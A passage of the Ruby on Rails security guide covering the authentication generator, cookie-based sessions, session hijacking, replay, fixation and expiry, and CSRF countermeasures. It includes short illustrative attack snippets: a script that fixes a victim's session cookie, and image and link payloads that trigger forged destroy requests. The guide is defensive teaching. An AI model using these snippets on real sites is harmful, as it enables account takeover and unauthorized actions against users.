<h2 id="introduction">Introduction</h2>

<p>Web application frameworks are made to help developers build web applications. Some of them also help you with securing the web application. In fact one framework is not more secure than another: If you use it correctly, you will be able to build secure apps with many frameworks. Ruby on Rails has some clever helper methods, for example against SQL injection, so this is hardly a problem.</p>

<p>In general there is no such thing as plug-n-play security. Security depends on the people using the framework, and sometimes on the development method. And it depends on all layers of a web application environment: The back-end storage, the web server, and the web application itself (and possibly other layers or applications).</p>

<p>The Gartner Group, however, estimates that 75% of attacks are at the web application layer, and found out “that out of 300 audited sites, 97% are vulnerable to attack”. This is because web applications are relatively easy to attack, as they are simple to understand and manipulate, even by the lay person.</p>

<p>The threats against web applications include user account hijacking, bypass of access control, reading or modifying sensitive data, or presenting fraudulent content. Or an attacker might be able to install a Trojan horse program or unsolicited e-mail sending software, aim at financial enrichment, or cause brand name damage by modifying company resources. In order to prevent attacks, minimize their impact and remove points of attack, first of all, you have to fully understand the attack methods in order to find the correct countermeasures. That is what this guide aims at.</p>

<p>In order to develop secure web applications you have to keep up to date on all layers and know your enemies. To keep up to date subscribe to security mailing lists, read security blogs, and make updating and security checks a habit (check the <a href="#additional-resources">Additional Resources</a> chapter). It is done manually because that’s how you find the nasty logical security problems.</p>

<h2 id="authentication">Authentication</h2>

<p>Authentication is often one of the first features implemented in a web
application. It serves as the foundation for securing user data and is part of
most modern web applications.</p>

<p>Starting with version 8.0, Rails comes with a default authentication generator,
which provides a solid starting point for securing your application by only
allowing access to verified users.</p>

<p>The authentication generator adds all of the relevant models, controllers,
views, routes, and migrations needed for basic authentication and password reset
functionality.</p>

<p>To use this feature in your application, you can run <code class="language-plaintext highlighter-rouge">bin/rails generate
authentication</code>. Here are all of the files the generator modifies and new files
it adds:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>rails generate authentication
      invoke  erb
      create    app/views/passwords/new.html.erb
      create    app/views/passwords/edit.html.erb
      create    app/views/sessions/new.html.erb
      create  app/models/session.rb
      create  app/models/user.rb
      create  app/models/current.rb
      create  app/controllers/sessions_controller.rb
      create  app/controllers/concerns/authentication.rb
      create  app/controllers/passwords_controller.rb
      create  app/mailers/passwords_mailer.rb
      create  app/views/passwords_mailer/reset.html.erb
      create  app/views/passwords_mailer/reset.text.erb
      create  <span class="nb">test</span>/mailers/previews/passwords_mailer_preview.rb
        gsub  app/controllers/application_controller.rb
       route  resources :passwords, param: :token
       route  resource :session
        gsub  Gemfile
      bundle  <span class="nb">install</span> <span class="nt">--quiet</span>
    generate  migration CreateUsers email_address:string!:uniq password_digest:string! <span class="nt">--force</span>
       rails  generate migration CreateUsers email_address:string!:uniq password_digest:string! <span class="nt">--force</span>
      invoke  active_record
      create    db/migrate/20241010215312_create_users.rb
    generate  migration CreateSessions user:references ip_address:string user_agent:string <span class="nt">--force</span>
       rails  generate migration CreateSessions user:references ip_address:string user_agent:string <span class="nt">--force</span>
      invoke  active_record
      create    db/migrate/20241010215314_create_sessions.rb
</code></pre></div></div>

<p>As shown above, the authentication generator modifies the <code class="language-plaintext highlighter-rouge">Gemfile</code> to add the
<a href="https://github.com/bcrypt-ruby/bcrypt-ruby/">bcrypt</a> gem. The generator uses
the <code class="language-plaintext highlighter-rouge">bcrypt</code> gem to create a hash of the password, which is then stored in the
database (instead of the plain-text password). As this process is not
reversible, there’s no way to go from the hash back to the password. The hashing
algorithm is deterministic though, so the stored password is able to be compared
with the hash of the user-inputted password during authentication.</p>

<p>The generator adds two migration files for creating <code class="language-plaintext highlighter-rouge">user</code> and <code class="language-plaintext highlighter-rouge">session</code> tables.
Next step is to run the migrations:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>bin/rails db:migrate
</code></pre></div></div>

<p>Then, if you visit <code class="language-plaintext highlighter-rouge">/session/new</code> in your browser (you will see this route has
been added in <code class="language-plaintext highlighter-rouge">routes.rb</code>), you’ll see a form that accepts an email and a
password with “sign in” button. This form routes to the <code class="language-plaintext highlighter-rouge">SessionsController</code>
which was added by the generator. If you provide an email/password for a user
that exists in the database, you will be able to successfully authenticate with
those credentials and login to the application.</p>

<p>NOTE: After running the Authentication generator, you do need to implement your
own <em>sign up flow</em> and add the necessary views, routes, and controller actions.
There is no code generated that creates new <code class="language-plaintext highlighter-rouge">user</code> records and allows users to
“sign up” in the first place. This is something you’ll need to wire up based on
the requirements of your application.</p>

<p>Here is a list of modified files:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>On branch main
Changes not staged <span class="k">for </span>commit:
  <span class="o">(</span>use <span class="s2">"git add &lt;file&gt;..."</span> to update what will be committed<span class="o">)</span>

  db/schema.rb
  <span class="nb">test</span>/mailers/previews/
</code></pre></div></div>

<h3 id="reset-password">Reset Password</h3>

<p>The authentication generator also adds reset password functionality. You can see
a “forgot password?” link on the “sign in” page. Clicking that link navigates to
the <code class="language-plaintext highlighter-rouge">/passwords/new</code> path and routes to the passwords controller. The <code class="language-plaintext highlighter-rouge">new</code>
method of the <code class="language-plaintext highlighter-rouge">PasswordsController</code> class runs through the flow for sending a
password reset email.</p>

<p>The mailers for <em>reset password</em> are also set up by the generator at
<code class="language-plaintext highlighter-rouge">app/mailers/password_mailer.rb</code> and render the following email to send to the
user:</p>

<pre><code class="language-html+erb"># app/views/passwords_mailer/reset.html.erb
&lt;p&gt;
  You can reset your password within the next 15 minutes on
  &lt;%= link_to "this password reset page", edit_password_url(@user.password_reset_token) %&gt;.
&lt;/p&gt;
</code></pre>

<h3 id="implementation-details">Implementation Details</h3>

<p>This section covers some of the implementation details around the authentication
flow added by the authentication generator: The <code class="language-plaintext highlighter-rouge">has_secure_password</code> method,
the <code class="language-plaintext highlighter-rouge">authenticate_by</code> method, and the <code class="language-plaintext highlighter-rouge">Authentication</code> concern.</p>

<h4 id="has_secure_password"><code class="language-plaintext highlighter-rouge">has_secure_password</code></h4>

<p>The
<a href="https://api.rubyonrails.org/classes/ActiveModel/SecurePassword/ClassMethods.html#method-i-has_secure_password"><code class="language-plaintext highlighter-rouge">has_secure_password</code></a>
method is added to the <code class="language-plaintext highlighter-rouge">user</code> model and takes care of storing a hashed password
using the <code class="language-plaintext highlighter-rouge">bcrypt</code> algorithm:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">User</span> <span class="o">&lt;</span> <span class="no">ApplicationRecord</span>
  <span class="n">has_secure_password</span>
  <span class="n">has_many</span> <span class="ss">:sessions</span><span class="p">,</span> <span class="ss">dependent: :destroy</span>

  <span class="n">normalizes</span> <span class="ss">:email_address</span><span class="p">,</span> <span class="ss">with: </span><span class="o">-&gt;</span> <span class="n">e</span> <span class="p">{</span> <span class="n">e</span><span class="p">.</span><span class="nf">strip</span><span class="p">.</span><span class="nf">downcase</span> <span class="p">}</span>
<span class="k">end</span>
</code></pre></div></div>

<h4 id="authenticate_by"><code class="language-plaintext highlighter-rouge">authenticate_by</code></h4>

<p>The
<a href="https://api.rubyonrails.org/classes/ActiveRecord/SecurePassword/ClassMethods.html"><code class="language-plaintext highlighter-rouge">authenticate_by</code></a>
method is used in the <code class="language-plaintext highlighter-rouge">SessionsController</code> while creating a new session to
validate that the credentials provided by the user match the credentials stored
in the database (e.g. password) for that user:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">SessionsController</span> <span class="o">&lt;</span> <span class="no">ApplicationController</span>
  <span class="k">def</span> <span class="nf">create</span>
    <span class="k">if</span> <span class="n">user</span> <span class="o">=</span> <span class="no">User</span><span class="p">.</span><span class="nf">authenticate_by</span><span class="p">(</span><span class="n">params</span><span class="p">.</span><span class="nf">permit</span><span class="p">(</span><span class="ss">:email_address</span><span class="p">,</span> <span class="ss">:password</span><span class="p">))</span>
      <span class="n">start_new_session_for</span> <span class="n">user</span>
      <span class="n">redirect_to</span> <span class="n">after_authentication_url</span>
    <span class="k">else</span>
      <span class="n">redirect_to</span> <span class="n">new_session_url</span><span class="p">,</span> <span class="ss">alert: </span><span class="s2">"Try another email address or password."</span>
    <span class="k">end</span>
  <span class="k">end</span>

  <span class="c1"># ...</span>
<span class="k">end</span>
</code></pre></div></div>

<p>If the credentials are valid, a new <code class="language-plaintext highlighter-rouge">Session</code> is created for that user.</p>

<h4 id="session-management">Session Management</h4>

<p>The core functionality around session management is implemented in the
<code class="language-plaintext highlighter-rouge">Authentication</code> controller concern, which is included by the
<code class="language-plaintext highlighter-rouge">ApplicationController</code> in your application. You can explore details of the
<a href="https://github.com/rails/rails/blob/main/railties/lib/rails/generators/rails/authentication/templates/app/controllers/concerns/authentication.rb.tt">authentication
concern</a>
in the source code.</p>

<p>One method to note in the <code class="language-plaintext highlighter-rouge">Authentication</code> concern is <code class="language-plaintext highlighter-rouge">authenticated?</code>, a helper
method available in view templates. You can use this method to conditionally
display links/buttons depending on whether a user is currently authenticated.
For example:</p>

<pre><code class="language-html+erb">&lt;% if authenticated? %&gt;
  &lt;%= button_to "Sign Out", session_path, method: :delete  %&gt;
&lt;% else %&gt;
  &lt;%= link_to "Sign In", new_session_path %&gt;
&lt;% end %&gt;
</code></pre>

<p>TIP: You can find all of the details for the Authentication generator in the
Rails source code. You are encouraged to explore the implementation details and
not treat authentication as a black box.</p>

<p>With the authentication generator configured as above, your application is ready
for a more secure user authentication and password recovery process in just a
few steps.</p>

<h2 id="sessions">Sessions</h2>

<p>This chapter describes some particular attacks related to sessions, and security measures to protect your session data.</p>

<h3 id="what-are-sessions">What are Sessions?</h3>

<p>INFO: Sessions enable the application to maintain user-specific state, while users interact with the application. For example, sessions allow users to authenticate once and remain signed in for future requests.</p>

<p>Most applications need to keep track of state for users that interact with the application. This could be the contents of a shopping basket, or the user id of the currently logged in user. This kind of user-specific state can be stored in the session.</p>

<p>Rails provides a session object for each user that accesses the application. If the user already has an active session, Rails uses the existing session. Otherwise a new session is created.</p>

<p>NOTE: Read more about sessions and how to use them in <a href="action_controller_overview.html#session">Action Controller Overview Guide</a>.</p>

<h3 id="session-hijacking">Session Hijacking</h3>

<p>WARNING: <em>Stealing a user’s session ID lets an attacker use the web application in the victim’s name.</em></p>

<p>Many web applications have an authentication system: a user provides a username and password, the web application checks them and stores the corresponding user id in the session hash. From now on, the session is valid. On every request the application will load the user, identified by the user id in the session, without the need for new authentication. The session ID in the cookie identifies the session.</p>

<p>Hence, the cookie serves as temporary authentication for the web application. Anyone who seizes a cookie from someone else, may use the web application as this user - with possibly severe consequences. Here are some ways to hijack a session, and their countermeasures:</p>

<ul>
  <li>
    <p>Sniff the cookie in an insecure network. A wireless LAN can be an example of such a network. In an unencrypted wireless LAN, it is especially easy to listen to the traffic of all connected clients. For the web application builder this means to <em>provide a secure connection over SSL</em>. In Rails 3.1 and later, this could be accomplished by always forcing SSL connection in your application config file:</p>

    <div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">config</span><span class="p">.</span><span class="nf">force_ssl</span> <span class="o">=</span> <span class="kp">true</span>
</code></pre></div>    </div>
  </li>
  <li>
    <p>Most people don’t clear out the cookies after working at a public terminal. So if the last user didn’t log out of a web application, you would be able to use it as this user. Provide the user with a <em>log-out button</em> in the web application, and <em>make it prominent</em>.</p>
  </li>
  <li>
    <p>Many cross-site scripting (XSS) exploits aim at obtaining the user’s cookie. You’ll read <a href="#cross-site-scripting-xss">more about XSS</a> later.</p>
  </li>
  <li>
    <p>Instead of stealing a cookie unknown to the attacker, they fix a user’s session identifier (in the cookie) known to them. Read more about this so-called session fixation later.</p>
  </li>
</ul>

<h3 id="session-storage">Session Storage</h3>

<p>NOTE: Rails uses <code class="language-plaintext highlighter-rouge">ActionDispatch::Session::CookieStore</code> as the default session storage.</p>

<p>TIP: Learn more about other session storages in <a href="action_controller_overview.html#session">Action Controller Overview Guide</a>.</p>

<p>Rails <code class="language-plaintext highlighter-rouge">CookieStore</code> saves the session hash in a cookie on the client-side.
The server retrieves the session hash from the cookie and
eliminates the need for a session ID. That will greatly increase the
speed of the application, but it is a controversial storage option and
you have to think about the security implications and storage
limitations of it:</p>

<ul>
  <li>
    <p>Cookies have a size limit of 4 kB. Use cookies only for data which is relevant for the session.</p>
  </li>
  <li>
    <p>Cookies are stored on the client-side. The client may preserve cookie contents even for expired cookies. The client may copy cookies to other machines. Avoid storing sensitive data in cookies.</p>
  </li>
  <li>
    <p>Cookies are temporary by nature. The server can set expiration time for the cookie, but the client may delete the cookie and its contents before that. Persist all data that is of more permanent nature on the server side.</p>
  </li>
  <li>
    <p>Session cookies do not invalidate themselves and can be maliciously
reused. It may be a good idea to have your application invalidate old
session cookies using a stored timestamp.</p>
  </li>
  <li>
    <p>Rails encrypts cookies by default. The client cannot read or edit the contents of the cookie, without breaking encryption. If you take appropriate care of your secrets, you can consider your cookies to be generally secured.</p>
  </li>
</ul>

<p>The <code class="language-plaintext highlighter-rouge">CookieStore</code> uses the
<a href="https://api.rubyonrails.org/classes/ActionDispatch/Cookies/ChainedCookieJars.html#method-i-encrypted">encrypted</a>
cookie jar to provide a secure, encrypted location to store session
data. Cookie-based sessions thus provide both integrity as well as
confidentiality to their contents. The encryption key, as well as the
verification key used for
<a href="https://api.rubyonrails.org/classes/ActionDispatch/Cookies/ChainedCookieJars.html#method-i-signed">signed</a>
cookies, is derived from the <code class="language-plaintext highlighter-rouge">secret_key_base</code> configuration value.</p>

<p>TIP: Secrets must be long and random. Use <code class="language-plaintext highlighter-rouge">bin/rails secret</code> to get new unique secrets.</p>

<p>INFO: Learn more about <a href="security.html#custom-credentials">managing credentials later in this guide</a></p>

<p>It is also important to use different salt values for encrypted and
signed cookies. Using the same value for different salt configuration
values may lead to the same derived key being used for different
security features which in turn may weaken the strength of the key.</p>

<p>In test and development applications get a <code class="language-plaintext highlighter-rouge">secret_key_base</code> derived from the app name. Other environments must use a random key present in <code class="language-plaintext highlighter-rouge">config/credentials.yml.enc</code>, shown here in its decrypted state:</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">secret_key_base</span><span class="pi">:</span> <span class="s">492f...</span>
</code></pre></div></div>

<p>WARNING: If your application’s secrets may have been exposed, strongly consider changing them. Note that changing <code class="language-plaintext highlighter-rouge">secret_key_base</code> will expire currently active sessions and require all users to log in again. In addition to session data: encrypted cookies, signed cookies, and Active Storage files may also be affected.</p>

<h3 id="rotating-encrypted-and-signed-cookies-configurations">Rotating Encrypted and Signed Cookies Configurations</h3>

<p>Rotation is ideal for changing cookie configurations and ensuring old cookies
aren’t immediately invalid. Your users then have a chance to visit your site,
get their cookie read with an old configuration and have it rewritten with the
new change. The rotation can then be removed once you’re comfortable enough
users have had their chance to get their cookies upgraded.</p>

<p>It’s possible to rotate the ciphers and digests used for encrypted and signed cookies.</p>

<p>For instance to change the digest used for signed cookies from SHA1 to SHA256,
you would first assign the new configuration value:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Rails</span><span class="p">.</span><span class="nf">application</span><span class="p">.</span><span class="nf">config</span><span class="p">.</span><span class="nf">action_dispatch</span><span class="p">.</span><span class="nf">signed_cookie_digest</span> <span class="o">=</span> <span class="s2">"SHA256"</span>
</code></pre></div></div>

<p>Now add a rotation for the old SHA1 digest so existing cookies are
seamlessly upgraded to the new SHA256 digest.</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Rails</span><span class="p">.</span><span class="nf">application</span><span class="p">.</span><span class="nf">config</span><span class="p">.</span><span class="nf">action_dispatch</span><span class="p">.</span><span class="nf">cookies_rotations</span><span class="p">.</span><span class="nf">tap</span> <span class="k">do</span> <span class="o">|</span><span class="n">cookies</span><span class="o">|</span>
  <span class="n">cookies</span><span class="p">.</span><span class="nf">rotate</span> <span class="ss">:signed</span><span class="p">,</span> <span class="ss">digest: </span><span class="s2">"SHA1"</span>
<span class="k">end</span>
</code></pre></div></div>

<p>Then any written signed cookies will be digested with SHA256. Old cookies
that were written with SHA1 can still be read, and if accessed will be written
with the new digest so they’re upgraded and won’t be invalid when you remove the
rotation.</p>

<p>Once users with SHA1 digested signed cookies should no longer have a chance to
have their cookies rewritten, remove the rotation.</p>

<p>While you can set up as many rotations as you’d like it’s not common to have many
rotations going at any one time.</p>

<p>For more details on key rotation with encrypted and signed messages as
well as the various options the <code class="language-plaintext highlighter-rouge">rotate</code> method accepts, please refer to
the
<a href="https://api.rubyonrails.org/classes/ActiveSupport/MessageEncryptor.html">MessageEncryptor API</a>
and
<a href="https://api.rubyonrails.org/classes/ActiveSupport/MessageVerifier.html">MessageVerifier API</a>
documentation.</p>

<h3 id="replay-attacks-for-cookiestore-sessions">Replay Attacks for CookieStore Sessions</h3>

<p>TIP: <em>Another sort of attack you have to be aware of when using <code class="language-plaintext highlighter-rouge">CookieStore</code> is the replay attack.</em></p>

<p>It works like this:</p>

<ul>
  <li>A user receives credits, the amount is stored in a session (which is a bad idea anyway, but we’ll do this for demonstration purposes).</li>
  <li>The user buys something.</li>
  <li>The new adjusted credit value is stored in the session.</li>
  <li>The user takes the cookie from the first step (which they previously copied) and replaces the current cookie in the browser.</li>
  <li>The user has their original credit back.</li>
</ul>

<p>Including a nonce (a random value) in the session solves replay attacks. A nonce is valid only once, and the server has to keep track of all the valid nonces. It gets even more complicated if you have several application servers. Storing nonces in a database table would defeat the entire purpose of CookieStore (avoiding accessing the database).</p>

<p>The best <em>solution against it is not to store this kind of data in a session, but in the database</em>. In this case store the credit in the database and the <code class="language-plaintext highlighter-rouge">logged_in_user_id</code> in the session.</p>

<h3 id="session-fixation">Session Fixation</h3>

<p>NOTE: <em>Apart from stealing a user’s session ID, the attacker may fix a session ID known to them. This is called session fixation.</em></p>

<p><img src="images/security/session_fixation.png" alt="Session fixation" /></p>

<p>This attack focuses on fixing a user’s session ID known to the attacker, and forcing the user’s browser into using this ID. It is therefore not necessary for the attacker to steal the session ID afterwards. Here is how this attack works:</p>

<ul>
  <li>The attacker creates a valid session ID: They load the login page of the web application where they want to fix the session, and take the session ID in the cookie from the response (see number 1 and 2 in the image).</li>
  <li>They maintain the session by accessing the web application periodically in order to keep an expiring session alive.</li>
  <li>The attacker forces the user’s browser into using this session ID (see number 3 in the image). As you may not change a cookie of another domain (because of the same origin policy), the attacker has to run a JavaScript from the domain of the target web application. Injecting the JavaScript code into the application by XSS accomplishes this attack. Here is an example: <code class="language-plaintext highlighter-rouge">&lt;script&gt;document.cookie="_session_id=16d5b78abb28e3d6206b60f22a03c8d9";&lt;/script&gt;</code>. Read more about XSS and injection later on.</li>
  <li>The attacker lures the victim to the infected page with the JavaScript code. By viewing the page, the victim’s browser will change the session ID to the trap session ID.</li>
  <li>As the new trap session is unused, the web application will require the user to authenticate.</li>
  <li>From now on, the victim and the attacker will co-use the web application with the same session: The session became valid and the victim didn’t notice the attack.</li>
</ul>

<h3 id="session-fixation---countermeasures">Session Fixation - Countermeasures</h3>

<p>TIP: <em>One line of code will protect you from session fixation.</em></p>

<p>The most effective countermeasure is to <em>issue a new session identifier</em> and declare the old one invalid after a successful login. That way, an attacker cannot use the fixed session identifier. This is a good countermeasure against session hijacking, as well. Here is how to create a new session in Rails:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">reset_session</span>
</code></pre></div></div>

<p>If you use the popular <a href="https://rubygems.org/gems/devise">Devise</a> gem for user management, it will automatically expire sessions on sign in and sign out for you. If you roll your own, remember to expire the session after your sign in action (when the session is created). This will remove values from the session, therefore <em>you will have to transfer them to the new session</em>.</p>

<p>Another countermeasure is to <em>save user-specific properties in the session</em>, verify them every time a request comes in, and deny access, if the information does not match. Such properties could be the remote IP address or the user agent (the web browser name), though the latter is less user-specific. When saving the IP address, you have to bear in mind that there are Internet service providers or large organizations that put their users behind proxies. <em>These might change over the course of a session</em>, so these users will not be able to use your application, or only in a limited way.</p>

<h3 id="session-expiry">Session Expiry</h3>

<p>NOTE: <em>Sessions that never expire extend the time-frame for attacks such as cross-site request forgery (CSRF), session hijacking, and session fixation.</em></p>

<p>One possibility is to set the expiry time-stamp of the cookie with the session ID. However the client can edit cookies that are stored in the web browser so expiring sessions on the server is safer. Here is an example of how to <em>expire sessions in a database table</em>. Call <code class="language-plaintext highlighter-rouge">Session.sweep(20.minutes)</code> to expire sessions that were used longer than 20 minutes ago.</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">Session</span> <span class="o">&lt;</span> <span class="no">ApplicationRecord</span>
  <span class="k">def</span> <span class="nc">self</span><span class="o">.</span><span class="nf">sweep</span><span class="p">(</span><span class="n">time</span> <span class="o">=</span> <span class="mi">1</span><span class="p">.</span><span class="nf">hour</span><span class="p">)</span>
    <span class="n">where</span><span class="p">(</span><span class="ss">updated_at: </span><span class="o">...</span><span class="n">time</span><span class="p">.</span><span class="nf">ago</span><span class="p">).</span><span class="nf">delete_all</span>
  <span class="k">end</span>
<span class="k">end</span>
</code></pre></div></div>

<p>The section about session fixation introduced the problem of maintained sessions. An attacker maintaining a session every five minutes can keep the session alive forever, although you are expiring sessions. A simple solution for this would be to add a <code class="language-plaintext highlighter-rouge">created_at</code> column to the sessions table. Now you can delete sessions that were created a long time ago. Use this line in the sweep method above:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">where</span><span class="p">(</span><span class="ss">updated_at: </span><span class="o">...</span><span class="n">time</span><span class="p">.</span><span class="nf">ago</span><span class="p">).</span><span class="nf">or</span><span class="p">(</span><span class="n">where</span><span class="p">(</span><span class="ss">created_at: </span><span class="o">...</span><span class="mi">2</span><span class="p">.</span><span class="nf">days</span><span class="p">.</span><span class="nf">ago</span><span class="p">)).</span><span class="nf">delete_all</span>
</code></pre></div></div>

<h2 id="cross-site-request-forgery-csrf">Cross-Site Request Forgery (CSRF)</h2>

<p>This attack method works by including malicious code or a link in a page that accesses a web application that the user is believed to have authenticated. If the session for that web application has not timed out, an attacker may execute unauthorized commands.</p>

<p><img src="images/security/csrf.png" alt="Cross-Site Request Forgery" /></p>

<p>In the <a href="#sessions">session chapter</a> you have learned that most Rails applications use cookie-based sessions. Either they store the session ID in the cookie and have a server-side session hash, or the entire session hash is on the client-side. In either case the browser will automatically send along the cookie on every request to a domain, if it can find a cookie for that domain. The controversial point is that if the request comes from a site of a different domain, it will also send the cookie. Let’s start with an example:</p>

<ul>
  <li>Bob browses a message board and views a post from a hacker where there is a crafted HTML image element. The element references a command in Bob’s project management application, rather than an image file: <code class="language-plaintext highlighter-rouge">&lt;img src="http://www.webapp.com/project/1/destroy"&gt;</code></li>
  <li>Bob’s session at <code class="language-plaintext highlighter-rouge">www.webapp.com</code> is still alive, because he didn’t log out a few minutes ago.</li>
  <li>By viewing the post, the browser finds an image tag. It tries to load the suspected image from <code class="language-plaintext highlighter-rouge">www.webapp.com</code>. As explained before, it will also send along the cookie with the valid session ID.</li>
  <li>The web application at <code class="language-plaintext highlighter-rouge">www.webapp.com</code> verifies the user information in the corresponding session hash and destroys the project with the ID 1. It then returns a result page which is an unexpected result for the browser, so it will not display the image.</li>
  <li>Bob doesn’t notice the attack - but a few days later he finds out that project number one is gone.</li>
</ul>

<p>It is important to notice that the actual crafted image or link doesn’t necessarily have to be situated in the web application’s domain, it can be anywhere - in a forum, blog post, or email.</p>

<p>CSRF appears very rarely in CVE (Common Vulnerabilities and Exposures) - less than 0.1% in 2006 - but it really is a ‘sleeping giant’ [Grossman]. This is in stark contrast to the results in many security contract works - <em>CSRF is an important security issue</em>.</p>

<h3 id="csrf-countermeasures">CSRF Countermeasures</h3>

<p>NOTE: <em>First, as is required by the W3C, use GET and POST appropriately. Secondly, a security token in non-GET requests will protect your application from CSRF.</em></p>

<h4 id="use-get-and-post-appropriately">Use GET and POST Appropriately</h4>

<p>The HTTP protocol basically provides two main types of requests - GET and POST (DELETE, PUT, and PATCH should be used like POST). The World Wide Web Consortium (W3C) provides a checklist for choosing HTTP GET or POST:</p>

<p><strong>Use GET if:</strong></p>

<ul>
  <li>The interaction is more <em>like a question</em> (i.e., it is a safe operation such as a query, read operation, or lookup).</li>
</ul>

<p><strong>Use POST if:</strong></p>

<ul>
  <li>The interaction is more <em>like an order</em>, or</li>
  <li>The interaction <em>changes the state</em> of the resource in a way that the user would perceive (e.g., a subscription to a service), or</li>
  <li>The user is <em>held accountable for the results</em> of the interaction.</li>
</ul>

<p>If your web application is RESTful, you might be used to additional HTTP verbs, such as PATCH, PUT, or DELETE. Some legacy web browsers, however, do not support them - only GET and POST. Rails uses a hidden <code class="language-plaintext highlighter-rouge">_method</code> field to handle these cases.</p>

<p><em>POST requests can be sent automatically, too</em>. In this example, the link www.harmless.com is shown as the destination in the browser’s status bar. But it has actually dynamically created a new form that sends a POST request.</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"http://www.harmless.com/"</span> <span class="na">onclick=</span><span class="s">"
  var f = document.createElement('form');
  f.style.display = 'none';
  this.parentNode.appendChild(f);
  f.method = 'POST';
  f.action = 'http://www.example.com/account/destroy';
  f.submit();
  return false;"</span><span class="nt">&gt;</span>To the harmless survey<span class="nt">&lt;/a&gt;</span>
</code></pre></div></div>

<p>Or the attacker places the code into the onmouseover event handler of an image:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"http://www.harmless.com/img"</span> <span class="na">width=</span><span class="s">"400"</span> <span class="na">height=</span><span class="s">"400"</span> <span class="na">onmouseover=</span><span class="s">"..."</span> <span class="nt">/&gt;</span>
</code></pre></div></div>

<p>There are many other possibilities, like using a <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> tag to make a cross-site request to a URL with a JSONP or JavaScript response. The response is executable code that the attacker can find a way to run, possibly extracting sensitive data. To protect against this data leakage, we must disallow cross-site <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> tags. Ajax requests, however, obey the browser’s same-origin policy (only your own site is allowed to initiate <code class="language-plaintext highlighter-rouge">XmlHttpRequest</code>) so we can safely allow them to return JavaScript responses.</p>

<p>NOTE: We can’t distinguish a <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> tag’s origin—whether it’s a tag on your own site or on some other malicious site—so we must block all <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> across the board, even if it’s actually a safe same-origin script served from your own site. In these cases, explicitly skip CSRF protection on actions that serve JavaScript meant for a <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> tag.</p>

<h4 id="required-security-token">Required Security Token</h4>

<p>To protect against all other forged requests, we introduce a <em>required security token</em> that our site knows but other sites don’t know. We include the security token in requests and verify it on the server. This is done automatically when <a href="configuring.html#config-action-controller-default-protect-from-forgery"><code class="language-plaintext highlighter-rouge">config.action_controller.default_protect_from_forgery</code></a> is set to <code class="language-plaintext highlighter-rouge">true</code>, which is the default for newly created Rails applications. You can also do it manually by adding the following to your application controller:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">protect_from_forgery</span> <span class="ss">with: :exception</span>
</code></pre></div></div>

<p>This will include a security token in all forms generated by Rails. If the
security token doesn’t match what was expected, an exception will be thrown.</p>

<p>When submitting forms with <a href="https://turbo.hotwired.dev/">Turbo</a> the security
token is required as well. Turbo looks for the token in the <code class="language-plaintext highlighter-rouge">csrf</code> meta tags of
your application layout and adds it to request in the <code class="language-plaintext highlighter-rouge">X-CSRF-Token</code> request
header. These meta tags are created with the <a href="https://api.rubyonrails.org/classes/ActionView/Helpers/CsrfHelper.html#method-i-csrf_meta_tags"><code class="language-plaintext highlighter-rouge">csrf_meta_tags</code></a> helper
method:</p>

<div class="language-erb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;head&gt;</span>
  <span class="cp">&lt;%=</span> <span class="n">csrf_meta_tags</span> <span class="cp">%&gt;</span>
<span class="nt">&lt;/head&gt;</span>
</code></pre></div></div>

<p>which results in:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;head&gt;</span>
  <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"csrf-param"</span> <span class="na">content=</span><span class="s">"authenticity_token"</span> <span class="nt">/&gt;</span>
  <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"csrf-token"</span> <span class="na">content=</span><span class="s">"THE-TOKEN"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/head&gt;</span>
</code></pre></div></div>

<p>When making your own non-GET requests from JavaScript the security token is
required as well. <a href="https://github.com/rails/request.js">Rails Request.JS</a> is a
JavaScript library that encapsulates the logic of adding the required request
headers.</p>

<p>When using another library to make Ajax calls, it is necessary to add the
security token as a default header yourself. To get the token from the meta tag
you could do something like:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">document</span><span class="p">.</span><span class="nx">head</span><span class="p">.</span><span class="nf">querySelector</span><span class="p">(</span><span class="dl">"</span><span class="s2">meta[name=csrf-token]</span><span class="dl">"</span><span class="p">)?.</span><span class="nx">content</span>
</code></pre></div></div>

<h4 id="clearing-persistent-cookies">Clearing Persistent Cookies</h4>

<p>It is common to use persistent cookies to store user information, with <code class="language-plaintext highlighter-rouge">cookies.permanent</code> for example. In this case, the cookies will not be cleared and the out of the box CSRF protection will not be effective. If you are using a different cookie store than the session for this information, you must handle what to do with it yourself:</p>

